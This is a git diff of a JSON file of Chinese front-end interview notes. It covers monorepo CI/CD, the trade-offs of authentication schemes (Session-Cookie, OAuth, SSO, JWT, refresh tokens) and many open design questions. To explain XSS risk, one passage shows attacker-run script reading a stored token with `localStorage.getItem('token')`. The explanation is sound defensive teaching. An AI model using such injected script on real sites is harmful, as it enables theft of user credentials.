           "content": "- **定义:** 将多个项目（Package）的代码存储在一个 Git 仓库中。最终的构建（Build）和部署（Deploy）仍然是**按需、独立**进行的。\n\n- **常用工具:** Lerna, Nx, Turborepo, Yarn/pnpm Workspace。\n\n- **优势:**\n  \n  - **代码共享:** 易于在不同项目间共享代码和配置。\n  \n  - **原子提交:** 一个 Commit 可以涉及多个项目，提交历史清晰。\n  \n  - **统一依赖:** 容易实现依赖版本统一。\n\n- **挑战:** 仓库体积大，工具配置复杂，权限控制难度增加。\n\n- CI：**Monorepo 工具的集成 (Nx/Turborepo):** 这些工具可以智能地判断**哪些项目**受到了代码变动的影响。例如，在 CI 中运行 `npx nx affected:build`，只构建那些代码或其依赖发生变化的子项目。\n\n- 通常会有一个位于 Monorepo 根目录下的**主 CI 配置文件**，它负责调用 Monorepo 工具，并确定哪个子项目的部署流程需要被触发。\n\n- **部署脚本：** 具体的部署逻辑（例如如何将文件上传到 S3 或如何调用 K8s 部署 API）通常会封装成每个项目内部的独立脚本，或由主 CI 配置文件通过参数动态调用。\n\n**总结：** 在 Monorepo 中，CI 流程是**集中的且智能的**；而 CD 流程是**分散的且独立的**。",
           "hasAnswer": true
         },
         {
-          "id": "cicd-11",
+          "id": "cicd-12",
           "title": "包管理和版本控制策略",
           "content": "- **版本锁定:** 强制使用 `package-lock.json` 或 `pnpm-lock.yaml` 锁定依赖版本，确保不同环境下的依赖一致性。\n\n- **包管理:** 使用 **pnpm Workspace**（基于 Monorepo 的包管理）来实现依赖共享和节省空间。\n\n模块的单例行为与 React Hooks 或 Vue Composition API 中的 `composable`（组合式函数）的行为，构成了前端状态管理和逻辑复用的两种截然不同的模式。\n\n模块：共享的应用级状态\n\nHooks / Composable：隔离的组件级状态",
           "hasAnswer": true
@@ -1399,30 +1447,36 @@
         },
         {
           "id": "open-questions-2",
-          "title": "开放题&场景题",
-          "content": "##### 前端鉴权的几种方式\n\n大文件上传\n\n前端截图，海报绘制\n\n自动化发布，发布版本号，停留页面提示更新\n\n##### SSR-SSG-SPA-MPA\n\n调试console\n\n##### 前端存储 Local storage，session，indexDB，cookie，根据写的倒计时代码，穿插着问的，问的很深\n\nIndexDB存储上限\n\nfile blob\n\n##### npm install后发生了什么\n\n浏览器地址栏url后发生了什么\n\njs写倒计时组件代码，并优化，长时间怎么解决误差，数据量大怎么办\n\n用过的 AI大模型，使用方式，用了他们那些功能，觉得AI大模型他们存在有什么样的缺点\n\n##### 前端性能指标有哪些?(LCP, FID,CLS等)如何优化这些指标\n\n##### 某个复杂模块的设计思路、遇到的性能瓶颈及解决方案\n\n如何设计一个高可用的前端系统\n\n##### 前端监控系统如何设计?如何上报和分析数据?\n\nPWA (Progressive Web Apps)了解吗?它的核心技术有哪些\n\n谈谈你对SSR(Server-Side Rendering)和 CSR (Client-Side Rendering) 的理解。\n\n如何处理前端的兼容性问题?\n\n对于新技术，你是如何学习和评估的\n\n你认为前端未来3-5年的发展方向是什么?\n\n##### 设计一个在线文档协同编辑的方案，需要考虑哪些技术点\n\n你遇到的最大的技术挑战是什么?从中学习到了什么?\n\n除了 redux mbox dva 还用过其他的 状态管理没\n\n职业发展，今年的打算\n\n组件升级怎么让使用这个组件的人都知道\n\n如果让你设计项目自动设计组件升级，并且安全，你会怎么去设计\n\n用setTimeout实现setInterva，用requestAnimationFrame实现setTimeout\n\n##### Web Workers 的工作原理和使用场景\n\nWeb Workers 是浏览器提供的**多线程解决方案**，允许在后台线程中运行 JavaScript 代码，避免阻塞主线程（UI 线程）。主要优势：\n\n- 提高用户体验：耗时计算放在后台，保证主界面流畅。\n\n- 利用多核 CPU：现代浏览器可以将 Worker 调度到不同的 CPU 核心上并行执行。\n\n#### 跨浏览器 跨终端开发的兼容性处理方案\n\n挑战：\n\n 不同设备：屏幕尺寸与分辨率，输入方式差异，性能与网络条件\n\n- **性能考量**：考虑不同设备的性能差异\n\n- **工具自动化**：使用构建工具处理大部分兼容性问题\n\n- **组件库**：使用成熟的 UI 库（如 Ant Design、Material-UI）\n\n\"描述一种方法，用以实现一个动态加载内容的无限滚动列表。\"\n\n\"如果你有一个含有数百个项目的数组，你将如何有效地搜索特定项目?\"\n\n\"我们的游戏界面需要实时更新玩家的得分，你会如何设计前端架构来实现这一功能?\"\n\n##### \"解释什么是服务工作线程(Service Worker)，以及它可以如何帮助提高一个游戏网站的性能?\"\n\nservice worker是web worker的一种，Service Worker 脚本在后台运行，与网页的生命周期分离。它最强大的能力是拦截和处理流经它的网络请求，以及持久化存储的能力，这使得缓存控制和离线体验成为可能。\n\n- **请求拦截能力（`fetch` 事件）。**\n\n- **持久化存储能力（`Cache Storage API`）。**\n\n\"如何在前端项目中实现国际化和本地化?\n\n模块化的演进历程\n\nJavaScript 内存管理和垃圾回收\n\n防抖和节流的实现与应用\n\n深拷贝的多种实现方案\n\n函数式编程在项目中的应用?\n\n##### 错误监控和异常处理\n\n前端安全(XSS/CSRF)防护\n\nWebpack 构建流程和原理\n\n##### 前端性能指标有哪些?(LCP,FID,CLS等)如何优化这些指标?\n\n你觉得js里this的设计怎么样?有没有什么缺点啥的\n\n##### 如果让你从零开始搭建一个大型电商网站的前端架构，你会如何设计?考虑哪些问题如何解决\n\n架化 与设计共同维护的UI库\n\nCICD 打包工具 nginx 部署流程CDN OSS 通常都是接公司平台 灰度发布\n\n团队与工程化 menorepo 规范 lint prettier 微前端\n\n监控报警 sentry\n\n其他 国际化 与设计共同维护的UI库\n\n##### 项目报错如何定位，sourcemap\n\n**Sourcemap 是源码和编译后代码的映射文件**，让浏览器能将压缩混淆后的代码映射回原始源代码。在复杂的现代前端项目中，代码经过构建工具（如 Webpack、Vite）的打包、压缩、混淆，生产环境在监控工具或浏览器控制台中，错误堆栈显示的是 **压缩后的文件名、行号和列号**（例如 `main.js:123:45`）。当浏览器或监控工具遇到一个指向 `main.js:123:45` 的错误时，根据sourcemap 查找对应的 `main.js.map` 文件。这个 `.map` 文件存储了原始代码和压缩代码之间的**映射关系**（即 `main.js` 的第 123 行第 45 列对应于 `src/components/UserForm.vue` 的第 50 行第 10 列）。map文件建议不部署到生产服务器。而是将 `.map` 文件上传到错z误监控平台（如 Sentry）。\n\nreact 对比 vue，为什么react需要fiber\n\n##### 如果让你从零开始搭建一个大型前端项目\n\n技术栈选型 框架 语言ts/js css 状态管理 组件库\n\n架构总体思路：ssr/csr SPA/MPA\n\nCICD 打包工具 nginx 部署流程CDN OSS 通常都是接公司平台 灰度发布\n\n团队与工程化 menorepo 规范 lint prettier 微前端\n\n监控报警 sentry\n\n其他 国际化 与设计共同维护的UI库\n\n##### 大型电商网站的架构，你会如何设计?考虑哪些问题如何解决\n\n高并发：忙绿兜底 下单锁 防刷\n\nSEO：ssr\n\nSKU复杂：SKU矩阵选择控件 库存变化要实时同步\n\n支付下单：流程复杂、强一致性要求高：必须 表单自动保存  交易失败兜底提示 幂等提交\n\n性能优化；OSS CDN \n\nA/B 测试、埋点\n\n安全\n\n##### 从0搭建一个内部脚手架项目\n\n##### 前端工程化的理解，如何自动化，成熟的体系应该具备哪些要素\n\n前端工程化的本质是——让前端开发从“手工活”变成“可规模化、可度量、可迭代的生产体系”，核心目标是：提效、稳定、可控。\n\n自动化质量控制 lint prettier git规范等\n\n自动化构建，自动化发布，保证性能、产物可控、灰度发布、流量分配、自动回滚\n\n监控报警\n\n前端工程化的核心是标准化 + 自动化 + 流程化 + 度量化。  \n成熟体系应该覆盖整个研发生命周期：从代码规范、项目结构、组件库沉淀、构建优化，到测试、CI/CD、灰度发布、监控报警。  \n最终目标是：让开发提效、质量可控、上线可回滚、运行可监控。\n\n##### 微前端\n\n两个角色，主应用和子应用\n\n技术难点：样式隔离，JavaScript 隔离，路由管理和应用切换，公共依赖的打包和互相引用、应用之间事件和数据传输\n\n解决：\n\n样式隔离：CSS Modules+CSS-in-JS\n\njs隔离：所有微应用共享全局环境（`window` 对象），如果微应用 A 在全局对象上挂载了变量，微应用 B 可能会意外使用或覆盖它。主流方案是：利用 ES6 的 `Proxy` 对象劫持对 `window` 对象的访问。微应用对 `window` 的读写操作都被 `Proxy` 拦截，读操作从全局 `window` 读取，写操作写入到**当前微应用自己的代理对象**中，从而隔离了对真实全局 `window` 的污染\n\n路由管理和应用切换：路由切换时，主应用能正确加载/卸载对应的微应用，并保持 URL 同步。监听 `hashchange` 或 `popstate` 事件，匹配路由，加载/卸载模块\n\n公共依赖：避免每个微应用都打包相同的库。方案两个方向，1是子应用不处理外部模块的打包，主应用负责加载公共包，2是webpack5的联邦模块，允许应用 A **暴露**其内部的模块（如 React 库）给应用 B **消费**，实现真正的运行时共享\n\n事件和数据传输：发布订阅模式/基于全局状态管理\n\n实现方案：\n\nQiankun：上手难度低，做了css  js隔离，有完整的生命周期钩子，支持多种技术栈。核心是沙箱机制和生命周期管理\n\nsingle-spa：核心作用是作为一个应用路由器（Application Router）和生命周期管理器\n\n联邦模块 (Webpack 5)，只用来处理公共依赖包的情况\n\n**最佳实践**通常是：**使用 Qiankun 或 Single-SPA 来管理应用的隔离和生命周期，同时使用 Webpack 联邦模块来优化公共依赖和公共组件的加载性能。\n\n##### 未来前端技术哪些需要特别关注的技术点\n\n\n\n##### 设计一套全站点请求耗时统计工具\n\n##### 双 token 无感刷新怎么做？如果 refresh token 也失效了，但你这时挂起了一堆请求，刷新失败了，怎么处理\n\n双 token 机制通常包括一个 **Access Token** (访问令牌) 和一个 **Refresh Token** (刷新令牌)。\n\n1. **Access Token (短有效期):** 用于访问受保护的资源，过期时间短（例如 10 分钟）。\n\n2. **Refresh Token (长有效期):** 用于在 Access Token 过期后，获取新的 Access Token，过期时间长（例如 7 天）\n\n当 Refresh Token 也失效时，意味着用户必须重新登录。此时核心问题是挂起的一堆请求如何在刷新登录后重试，方案是用一个全局的 **刷新锁** 和一个 **请求队列**。\n\n##### 如果要集成一个船上的摄像监控系统（第三方页面，但它不能改代码，只能iframe嵌进去，而且还要求根据用户权限控制展示内容，你会怎么处理\n\n方案1：通过代理服务器实现内容过滤，iframe嵌套后端路径，有权限时跳转，无权限时返回一个兜底\n\n方案2：利用 **第三方系统自身的 URL 参数** 进行控制，前提是第三方已有支持\n\n方案3：用前端遮罩进行视觉控制，只控制是否展示，内容有泄漏风险\n\n##### 有这样一个场景：如果你从多个系统的 API 拉数据，但这些系统的数据结构不一致，比如 A 系统返回 camelCase、B 系统是 snake_case，还有一些是中文 key，你怎么统一数据结构，来复用\n\n核心思想：在逻辑和外部 API 之间，建立一个专门负责转换的中间层——**适配器 (Adapter)**。每个外部系统都有一个专属的适配器，该适配器只负责：从外部系统获取数据 $\\rightarrow$ 将其转换成规范模型 $\\rightarrow$ 传递给你的应用核心逻辑。\n\n对于 **`camelCase` 和 `snake_case`** 之间的转换，可以使用成熟的库进行自动化处理\n\n对于中文 Key 或需要复杂的**业务值转换**，需要硬编码映射规则，维护一个 JSON 或 YAML **映射文件**\n\n##### 如果让你来你现在负责一个项目，有20+个页面，需求方经常改字段、加字段，你每次都要改组件，这个时候你怎么来设计\n\n思路：数据驱动渲染+配置化\n\n配置层：把字段抽象出一套配置文件\n\n业务组件和渲染逻辑层都不需要关心如何配置，而是根据配置自动化地应用\n\n##### 如果你要做一个拖拽式仪表盘Dashboard用户呢能自己拖拽、组合图表组件展示不同数据源的信息，你会怎么来设计这个系统\n\n##### 如果现在一个页面要同时展示 300 辆车的实时位置+轨迹，你怎么来优化\n\n数据层面+渲染层面\n\n数据：后续更新只传输增量变化的字段\n\n渲染：分区绘制/懒加载；WebGL/Canvas 渲染；前端聚合（在地图缩放级别较低时，将前端可见的密集点聚合成一个集群图标）；动画优化GPU加速和requestAnimationFrame\n\n**最佳实践组合：** 在后端实现 **视窗过滤** 和 **轨迹简化**，并使用 **WebSocket** 推送增量位置数据。在前端，使用 **WebGL 地图库** (如 Mapbox GL JS) 进行高性能渲染。\n\n##### 地图中你是怎么处理车辆轨迹“绕圈走”的情况的？比如一个车在原地掉头、拐弯，但 GPS 连续记录了好几个点，那肯定你的轨迹图就会一堆锯齿，怎么来做呢\n\n##### GeoJSON 有哪些字段？你在做行政区边界展示的时候，做过数据裁剪吗？如果只展示“浦东新区”这一个区的数据，你怎么只加载它？\n\n##### 怎么处理 WebSocket 的多连接问题？比如你一个页面要同时订阅车辆位置、报警事件、设备状态，怎么复用，保证不丢数据\n\n##### 有没有处理过图表/地图上的数据级联问题？比如点击图表某个项目，地图跟着联动展示，这块怎么处理的\n\n##### 你认为一个优秀的前端架构师/高级工程师需要具备哪些特质?在你的团队中，你是如何推动技术规范落地和技术选型的?\n\n##### 低代码平台如何实现远程组件的动态加载?\n\n####",
+          "title": "前端鉴权的几种方式和优缺点",
+          "content": "##### Session-Cookie 鉴权（传统主流）\n\n这是最经典的“有状态”鉴权方式。\n\n- **流程**：用户登录成功，服务器创建一个 **Session** 记录并存储在内存/Redis中，同时向浏览器返回一个包含 `SessionID` 的 **Cookie**。后续请求浏览器会自动带上该 Cookie。\n    \n- **优点**：\n    \n    - **安全性高**：敏感数据存在服务端，Cookie 设置 `HttpOnly` 可防 XSS。\n        \n    - **可控性强**：服务端可以随时销毁 Session 强制用户下线。\n        \n- **缺点**：\n    \n    - **扩展性差**：多台服务器时需要做 Session 共享（如同步到 Redis），否则负载均衡会导致登录失效。\n        \n    - **跨端不友好**：原生 App 或小程序对 Cookie 的支持不如浏览器。\n        \n    - **CSRF 风险**：因为依赖 Cookie 自动携带，容易受到 CSRF 攻击。\n\n##### OAuth 2.0 (第三方授权)\n\n这通常用于“第三方登录”（如微信、GitHub 登录）或分布式系统间的权限委派。\n\n- **流程**：\n    1. 用户向授权服务器申请授权。\n    2. 授权服务器返回 **Code (授权码)**。\n    3. 后端用 Code 换取 **Access Token**。\n- **优点**：\n    - **安全性**：用户不需要将密码交给第三方应用。\n    - **细粒度**：可以控制只授权读取头像、不授权发动态等权限。\n- **缺点**：\n    - **逻辑复杂**：需要多次跳转和 Code 换 Token 的过程。\n\n##### SSO (Single Sign-On, 单点登录)\n\n解决“一个公司有多个子系统，登录一次即可访问所有”的需求。\n\n- **实现方式**：\n    \n    - **同父域**：通过设置 Cookie 的 `Domain` 为父域名（如 `.baidu.com`），让子域共享 Cookie。\n        \n    - **跨域**：使用 CAS (Central Authentication Service) 模式。用户重定向到独立的 **认证中心**，登录后携带 Ticket 回跳。\n        \n- **优点**：提升用户体验，统一管理账号。\n    \n- **缺点**：认证中心一旦宕机，所有关联系统全部瘫痪（单点故障）。\n\n#####  JWT (JSON Web Token)？\n\n**J这是“无状态”鉴权的代表，非常适合前后端分离及分布式架构。\n\n- **结构：** 它由三部分组成：`Header`（算法信息）、`Payload`（用户信息，如 user_id）、`Signature`（签名，防止篡改）。\n- **存储：** 前端拿到后，通常不存在 Cookie 里，而是存在 `localStorage` 或 `sessionStorage` 中。\n- **传递：** 发请求时，前端手动把它塞进 HTTP Header 的 `Authorization` 字段里（例如：`Authorization: Bearer <token>`）\n\n##### 为什么 JWT 天然免疫 CSRF？\n\n**原因很简单：CSRF 攻击靠的是浏览器的“自动带 Cookie”机制。**\n\n- **Cookie 机制：** 它是浏览器的**原生行为**。不管你愿意不愿意，只要地址匹配，浏览器就自动帮你贴上 Cookie。黑客就是利用这种“自动”来完成攻击。\n    \n- **JWT 机制：** 它是**手动行为**。存在 `localStorage` 里的 JWT，浏览器绝对不会自动帮你带在 Header 里。必须由你（开发者）写代码 `headers: { 'Authorization': token }` 才能带上去。\n\n当用户点击黑客的 `a.com` 诱导链接时，黑客的脚本无法读取你 `b.com` 域名下的 `localStorage`（受同源策略保护），且浏览器不会自动给跨站请求加上 `Authorization` 头。**既然请求里没有 Token，服务器就会直接拒绝，CSRF 攻击就此失效。**\n\n#### JWT vs Cookie (Session) 深度对比\n\n| **维度**      | **Cookie + Session (传统)**      | **JWT (现代)**                 |\n| ----------- | ------------------------------ | ---------------------------- |\n| **存储位置**    | 服务器存 Session，客户端存 Cookie       | 服务器不存（无状态），客户端存 Token        |\n| **CSRF 防护** | **风险高**，需额外配合 Token 或 SameSite | **天然免疫**，因为不依赖浏览器自动行为        |\n| **水平扩展**    | 较难（多台服务器需要共享 Session）          | **非常容易**（服务器只要有密钥就能解密 Token） |\n| **时效性**     | 可以在服务端随时注销                     | 一旦签发，很难在有效期内提前作废             |\n#### JWT 就绝对安全了吗？（新的挑战）\n\n虽然 JWT 解决了 CSRF，但它引入了新的风险：**XSS 风险。**\n\n- **风险点：** 如果你的页面有 XSS 漏洞，黑客可以运行 JS 代码 `localStorage.getItem('token')`。一旦 Token 被偷走，黑客可以在任何地方冒充你。\n    \n- **对比：** Cookie 如果设置了 `HttpOnly`，JS 是读不到的，所以 Cookie 在防范 XSS 偷取凭证方面比 JWT 强。\n\n#### JWT进阶：双令牌机制 (Access Token + Refresh Token)\n\n**双令牌机制**（Dual Token Mechanism）是为了解决 JWT（JSON Web Token）的一个核心矛盾：**“安全性”与“用户体验”的博弈。**\n\n**双令牌机制的本质**：把“验证频率”和“登录频率”拆分开。\n\n| **令牌名称**                 | **作用**                                   | **有效期**           | **存储位置建议**                       |\n| ------------------------ | ---------------------------------------- | ----------------- | -------------------------------- |\n| **Access Token** (访问令牌)  | 真正的“通行证”，每次请求都携带。安全性高，即使被盗也很快失效。         | **短**（如 15-30 分钟） | 内存 (Vuex/Pinia) 或 SessionStorage |\n| **Refresh Token** (刷新令牌) | 专门用来换取新的 Access Token。只在刷新时才发送一次，暴露频率极低。 | **长**（如 7-14 天）   | LocalStorage 或 HttpOnly Cookie   |\n\n工作流程（无感续期）\n1. **用户登录**：服务端返回两个 Token：`accessToken` 和 `refreshToken`。\n2. **正常访问**：前端将 `accessToken` 放在 Header 里请求数据，后端验证通过。\n3. **令牌过期**：\n    - `accessToken` 过期，后端返回 **401 Unauthorized**（或特定错误码）。\n4. **无感刷新**：\n    - 前端拦截到 401 错误，**不跳转登录页**。\n    - 前端自动发起一个隐藏请求，携带 `refreshToken` 访问“刷新接口”。\n    - 服务端验证 `refreshToken` 有效，颁发一个新的 `accessToken` 给前端。\n5. **重新请求**：前端用新的 `accessToken` 重新发起刚才失败的那个业务请求。用户完全感觉不到中途发生了令牌置换。\n\n#### 工程上怎么选登录方案？\n\n- **Session-Cookie**：最成熟，安全性高，但对分布式系统不友好，且存在 CSRF 风险。需要配合 `HttpOnly`、`Secure`、`SameSite=Lax` 以及 `CSRF Token`，全方位防护。\n\n- **JWT**：目前最流行，它是无状态的，易于横向扩展，适合跨端，但要注意 XSS 防护以及 Token 吊销的问题。尤其 **移动端 (App / 小程序)** 首选 **JWT**。因为 App 没有浏览器的 Cookie 限制，JWT 跨域和扩展性极强。\n\n- **OAuth 2.0**：主要用于授权，是实现第三方登录的标准。\n\n- **SSO**：解决多系统间的统一登录问题。",
           "hasAnswer": true
         },
         {
           "id": "open-questions-3",
+          "title": "开放题&场景题",
+          "content": "大文件上传\n\n前端截图，海报绘制\n\n自动化发布，发布版本号，停留页面提示更新\n\n##### SSR-SSG-SPA-MPA\n\n调试console\n\n##### 前端存储 Local storage，session，indexDB，cookie，根据写的倒计时代码，穿插着问的，问的很深\n\nIndexDB存储上限\n\nfile blob\n\n##### npm install后发生了什么\n\n浏览器地址栏url后发生了什么\n\njs写倒计时组件代码，并优化，长时间怎么解决误差，数据量大怎么办\n\n用过的 AI大模型，使用方式，用了他们那些功能，觉得AI大模型他们存在有什么样的缺点\n\n##### 前端性能指标有哪些?(LCP, FID,CLS等)如何优化这些指标\n\n##### 某个复杂模块的设计思路、遇到的性能瓶颈及解决方案\n\n如何设计一个高可用的前端系统\n\n##### 前端监控系统如何设计?如何上报和分析数据?\n\nPWA (Progressive Web Apps)了解吗?它的核心技术有哪些\n\n谈谈你对SSR(Server-Side Rendering)和 CSR (Client-Side Rendering) 的理解。\n\n如何处理前端的兼容性问题?\n\n对于新技术，你是如何学习和评估的\n\n你认为前端未来3-5年的发展方向是什么?\n\n##### 设计一个在线文档协同编辑的方案，需要考虑哪些技术点\n\n你遇到的最大的技术挑战是什么?从中学习到了什么?\n\n除了 redux mbox dva 还用过其他的 状态管理没\n\n职业发展，今年的打算\n\n组件升级怎么让使用这个组件的人都知道\n\n如果让你设计项目自动设计组件升级，并且安全，你会怎么去设计\n\n用setTimeout实现setInterva，用requestAnimationFrame实现setTimeout\n\n##### Web Workers 的工作原理和使用场景\n\nWeb Workers 是浏览器提供的**多线程解决方案**，允许在后台线程中运行 JavaScript 代码，避免阻塞主线程（UI 线程）。主要优势：\n\n- 提高用户体验：耗时计算放在后台，保证主界面流畅。\n\n- 利用多核 CPU：现代浏览器可以将 Worker 调度到不同的 CPU 核心上并行执行。\n\n#### 跨浏览器 跨终端开发的兼容性处理方案\n\n挑战：\n\n 不同设备：屏幕尺寸与分辨率，输入方式差异，性能与网络条件\n\n- **性能考量**：考虑不同设备的性能差异\n\n- **工具自动化**：使用构建工具处理大部分兼容性问题\n\n- **组件库**：使用成熟的 UI 库（如 Ant Design、Material-UI）\n\n\"描述一种方法，用以实现一个动态加载内容的无限滚动列表。\"\n\n\"如果你有一个含有数百个项目的数组，你将如何有效地搜索特定项目?\"\n\n\"我们的游戏界面需要实时更新玩家的得分，你会如何设计前端架构来实现这一功能?\"\n\n##### \"解释什么是服务工作线程(Service Worker)，以及它可以如何帮助提高一个游戏网站的性能?\"\n\nservice worker是web worker的一种，Service Worker 脚本在后台运行，与网页的生命周期分离。它最强大的能力是拦截和处理流经它的网络请求，以及持久化存储的能力，这使得缓存控制和离线体验成为可能。\n\n- **请求拦截能力（`fetch` 事件）。**\n\n- **持久化存储能力（`Cache Storage API`）。**\n\n\"如何在前端项目中实现国际化和本地化?\n\n模块化的演进历程\n\nJavaScript 内存管理和垃圾回收\n\n防抖和节流的实现与应用\n\n深拷贝的多种实现方案\n\n函数式编程在项目中的应用?\n\n##### 错误监控和异常处理\n\n前端安全(XSS/CSRF)防护\n\nWebpack 构建流程和原理\n\n##### 前端性能指标有哪些?(LCP,FID,CLS等)如何优化这些指标?\n\n你觉得js里this的设计怎么样?有没有什么缺点啥的\n\n##### 如果让你从零开始搭建一个大型电商网站的前端架构，你会如何设计?考虑哪些问题如何解决\n\n架化 与设计共同维护的UI库\n\nCICD 打包工具 nginx 部署流程CDN OSS 通常都是接公司平台 灰度发布\n\n团队与工程化 menorepo 规范 lint prettier 微前端\n\n监控报警 sentry\n\n其他 国际化 与设计共同维护的UI库\n\n##### 项目报错如何定位，sourcemap\n\n**Sourcemap 是源码和编译后代码的映射文件**，让浏览器能将压缩混淆后的代码映射回原始源代码。在复杂的现代前端项目中，代码经过构建工具（如 Webpack、Vite）的打包、压缩、混淆，生产环境在监控工具或浏览器控制台中，错误堆栈显示的是 **压缩后的文件名、行号和列号**（例如 `main.js:123:45`）。当浏览器或监控工具遇到一个指向 `main.js:123:45` 的错误时，根据sourcemap 查找对应的 `main.js.map` 文件。这个 `.map` 文件存储了原始代码和压缩代码之间的**映射关系**（即 `main.js` 的第 123 行第 45 列对应于 `src/components/UserForm.vue` 的第 50 行第 10 列）。map文件建议不部署到生产服务器。而是将 `.map` 文件上传到错z误监控平台（如 Sentry）。\n\nreact 对比 vue，为什么react需要fiber\n\n##### 如果让你从零开始搭建一个大型前端项目\n\n技术栈选型 框架 语言ts/js css 状态管理 组件库\n\n架构总体思路：ssr/csr SPA/MPA\n\nCICD 打包工具 nginx 部署流程CDN OSS 通常都是接公司平台 灰度发布\n\n团队与工程化 menorepo 规范 lint prettier 微前端\n\n监控报警 sentry\n\n其他 国际化 与设计共同维护的UI库\n\n##### 大型电商网站的架构，你会如何设计?考虑哪些问题如何解决\n\n高并发：忙绿兜底 下单锁 防刷\n\nSEO：ssr\n\nSKU复杂：SKU矩阵选择控件 库存变化要实时同步\n\n支付下单：流程复杂、强一致性要求高：必须 表单自动保存  交易失败兜底提示 幂等提交\n\n性能优化；OSS CDN \n\nA/B 测试、埋点\n\n安全\n\n##### 从0搭建一个内部脚手架项目\n\n##### 前端工程化的理解，如何自动化，成熟的体系应该具备哪些要素\n\n前端工程化的本质是——让前端开发从“手工活”变成“可规模化、可度量、可迭代的生产体系”，核心目标是：提效、稳定、可控。\n\n自动化质量控制 lint prettier git规范等\n\n自动化构建，自动化发布，保证性能、产物可控、灰度发布、流量分配、自动回滚\n\n监控报警\n\n前端工程化的核心是标准化 + 自动化 + 流程化 + 度量化。  \n成熟体系应该覆盖整个研发生命周期：从代码规范、项目结构、组件库沉淀、构建优化，到测试、CI/CD、灰度发布、监控报警。  \n最终目标是：让开发提效、质量可控、上线可回滚、运行可监控。\n\n##### 微前端\n\n两个角色，主应用和子应用\n\n技术难点：样式隔离，JavaScript 隔离，路由管理和应用切换，公共依赖的打包和互相引用、应用之间事件和数据传输\n\n解决：\n\n样式隔离：CSS Modules+CSS-in-JS\n\njs隔离：所有微应用共享全局环境（`window` 对象），如果微应用 A 在全局对象上挂载了变量，微应用 B 可能会意外使用或覆盖它。主流方案是：利用 ES6 的 `Proxy` 对象劫持对 `window` 对象的访问。微应用对 `window` 的读写操作都被 `Proxy` 拦截，读操作从全局 `window` 读取，写操作写入到**当前微应用自己的代理对象**中，从而隔离了对真实全局 `window` 的污染\n\n路由管理和应用切换：路由切换时，主应用能正确加载/卸载对应的微应用，并保持 URL 同步。监听 `hashchange` 或 `popstate` 事件，匹配路由，加载/卸载模块\n\n公共依赖：避免每个微应用都打包相同的库。方案两个方向，1是子应用不处理外部模块的打包，主应用负责加载公共包，2是webpack5的联邦模块，允许应用 A **暴露**其内部的模块（如 React 库）给应用 B **消费**，实现真正的运行时共享\n\n事件和数据传输：发布订阅模式/基于全局状态管理\n\n实现方案：\n\nQiankun：上手难度低，做了css  js隔离，有完整的生命周期钩子，支持多种技术栈。核心是沙箱机制和生命周期管理\n\nsingle-spa：核心作用是作为一个应用路由器（Application Router）和生命周期管理器\n\n联邦模块 (Webpack 5)，只用来处理公共依赖包的情况\n\n**最佳实践**通常是：**使用 Qiankun 或 Single-SPA 来管理应用的隔离和生命周期，同时使用 Webpack 联邦模块来优化公共依赖和公共组件的加载性能。\n\n##### 未来前端技术哪些需要特别关注的技术点\n\n\n\n##### 设计一套全站点请求耗时统计工具\n\n##### 双 token 无感刷新怎么做？如果 refresh token 也失效了，但你这时挂起了一堆请求，刷新失败了，怎么处理\n\n双 token 机制通常包括一个 **Access Token** (访问令牌) 和一个 **Refresh Token** (刷新令牌)。\n\n1. **Access Token (短有效期):** 用于访问受保护的资源，过期时间短（例如 10 分钟）。\n\n2. **Refresh Token (长有效期):** 用于在 Access Token 过期后，获取新的 Access Token，过期时间长（例如 7 天）\n\n当 Refresh Token 也失效时，意味着用户必须重新登录。此时核心问题是挂起的一堆请求如何在刷新登录后重试，方案是用一个全局的 **刷新锁** 和一个 **请求队列**。\n\n##### 如果要集成一个船上的摄像监控系统（第三方页面，但它不能改代码，只能iframe嵌进去，而且还要求根据用户权限控制展示内容，你会怎么处理\n\n方案1：通过代理服务器实现内容过滤，iframe嵌套后端路径，有权限时跳转，无权限时返回一个兜底\n\n方案2：利用 **第三方系统自身的 URL 参数** 进行控制，前提是第三方已有支持\n\n方案3：用前端遮罩进行视觉控制，只控制是否展示，内容有泄漏风险\n\n##### 有这样一个场景：如果你从多个系统的 API 拉数据，但这些系统的数据结构不一致，比如 A 系统返回 camelCase、B 系统是 snake_case，还有一些是中文 key，你怎么统一数据结构，来复用\n\n核心思想：在逻辑和外部 API 之间，建立一个专门负责转换的中间层——**适配器 (Adapter)**。每个外部系统都有一个专属的适配器，该适配器只负责：从外部系统获取数据 $\\rightarrow$ 将其转换成规范模型 $\\rightarrow$ 传递给你的应用核心逻辑。\n\n对于 **`camelCase` 和 `snake_case`** 之间的转换，可以使用成熟的库进行自动化处理\n\n对于中文 Key 或需要复杂的**业务值转换**，需要硬编码映射规则，维护一个 JSON 或 YAML **映射文件**\n\n##### 如果让你来你现在负责一个项目，有20+个页面，需求方经常改字段、加字段，你每次都要改组件，这个时候你怎么来设计\n\n思路：数据驱动渲染+配置化\n\n配置层：把字段抽象出一套配置文件\n\n业务组件和渲染逻辑层都不需要关心如何配置，而是根据配置自动化地应用\n\n##### 如果你要做一个拖拽式仪表盘Dashboard用户呢能自己拖拽、组合图表组件展示不同数据源的信息，你会怎么来设计这个系统\n\n##### 如果现在一个页面要同时展示 300 辆车的实时位置+轨迹，你怎么来优化\n\n数据层面+渲染层面\n\n数据：后续更新只传输增量变化的字段\n\n渲染：分区绘制/懒加载；WebGL/Canvas 渲染；前端聚合（在地图缩放级别较低时，将前端可见的密集点聚合成一个集群图标）；动画优化GPU加速和requestAnimationFrame\n\n**最佳实践组合：** 在后端实现 **视窗过滤** 和 **轨迹简化**，并使用 **WebSocket** 推送增量位置数据。在前端，使用 **WebGL 地图库** (如 Mapbox GL JS) 进行高性能渲染。\n\n##### 地图中你是怎么处理车辆轨迹“绕圈走”的情况的？比如一个车在原地掉头、拐弯，但 GPS 连续记录了好几个点，那肯定你的轨迹图就会一堆锯齿，怎么来做呢\n\n##### GeoJSON 有哪些字段？你在做行政区边界展示的时候，做过数据裁剪吗？如果只展示“浦东新区”这一个区的数据，你怎么只加载它？\n\n##### 怎么处理 WebSocket 的多连接问题？比如你一个页面要同时订阅车辆位置、报警事件、设备状态，怎么复用，保证不丢数据\n\n##### 有没有处理过图表/地图上的数据级联问题？比如点击图表某个项目，地图跟着联动展示，这块怎么处理的\n\n##### 你认为一个优秀的前端架构师/高级工程师需要具备哪些特质?在你的团队中，你是如何推动技术规范落地和技术选型的?\n\n##### 低代码平台如何实现远程组件的动态加载?\n\n####",
+          "hasAnswer": true
+        },
+        {
+          "id": "open-questions-4",
           "title": "微信登录支付",
